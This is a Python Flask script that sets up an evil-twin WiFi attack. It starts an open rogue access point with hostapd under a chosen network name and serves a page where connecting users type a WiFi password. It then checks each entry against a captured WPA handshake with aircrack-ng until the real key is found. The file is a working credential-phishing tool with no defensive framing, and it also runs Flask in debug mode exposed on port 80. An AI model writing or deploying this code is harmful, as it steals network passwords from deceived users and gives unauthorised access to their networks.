# main.py

import os
import subprocess
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Set the desired WiFi SSID
WiFi_SSID = "YourWiFiNetwork"

# Create hostapd.conf file
hostapd_config = f'''
interface=wlan1
driver=nl80211
ssid={WiFi_SSID}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''

with open("hostapd.conf", "w") as conf_file:
    conf_file.write(hostapd_config)

# Start hostapd using subprocess
hostapd_process = subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check_password', methods=['POST'])
def check_password():
    user_input = request.json['password']

    # Save user input to the file
    with open("output.txt", "w") as file:
        file.write(user_input)

    # Placeholder for the aircrack-ng command (replace this with your actual command)
    aircrack_command = ["aircrack-ng", "MyHandShake.cap", "-w", "output.txt"]

    # Run the aircrack-ng command
    aircrack_result = subprocess.run(aircrack_command, capture_output=True, text=True)

    # Check the output for the correct password
    if "KEY FOUND" in aircrack_result.stdout:
        message = "Correct password :D"
    else:
        message = "Incorrect password! Please try again."

    return jsonify({'message': message})

if __name__ == "__main__":
    try:
        app.run(host='0.0.0.0', port=80, debug=True)
    finally:
        # Ensure to terminate the hostapd process when the Flask app exits
        hostapd_process.terminate()
